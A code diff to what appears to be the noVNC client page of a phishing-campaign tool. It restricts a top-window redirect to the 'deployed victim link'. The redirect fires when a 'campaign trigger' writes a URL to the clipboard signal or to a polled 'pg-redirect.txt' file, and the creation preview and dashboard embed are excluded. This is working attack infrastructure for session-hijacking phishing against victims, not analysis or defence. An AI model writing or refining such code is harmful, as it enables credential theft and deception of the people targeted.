@@ -46,6 +46,9 @@
         let port = readQueryVariable('port', window.location.port);
         const password = readQueryVariable('password');
         const path = readQueryVariable('path', 'websockify');
+        // Only the deployed victim link enables trigger-redirect. The creation
+        // preview (and the dashboard embed) must never redirect.
+        const allowRedirect = readQueryVariable('redirect', '') === '1';
 
         status("Connecting");
 
@@ -77,11 +80,12 @@
             if (typeof text !== "string" || !text.length) return;
 
             if (text.indexOf(REDIRECT_PREFIX) === 0) {
-                const target = text.slice(REDIRECT_PREFIX.length).trim();
-                if (target) {
-                    // Navigate the top-level window out of the noVNC session.
-                    const top = window.top || window;
-                    try { top.location.href = target; } catch (_) { window.location.href = target; }
+                if (allowRedirect) {
+                    const target = text.slice(REDIRECT_PREFIX.length).trim();
+                    if (target) {
+                        const top = window.top || window;
+                        try { top.location.href = target; } catch (_) { window.location.href = target; }
+                    }
                 }
                 return; // never mirror the signal to the laptop clipboard
             }
@@ -93,7 +97,7 @@
         // watcher writes when the campaign trigger fires. Reliable (no clipboard
         // / x11vnc dependency). When it holds a URL, leave noVNC for it.
         let redirected = false;
-        setInterval(async () => {
+        if (allowRedirect) setInterval(async () => {
             if (redirected) return;
             try {
                 const r = await fetch("pg-redirect.txt?t=" + Date.now(), { cache: "no-store" });
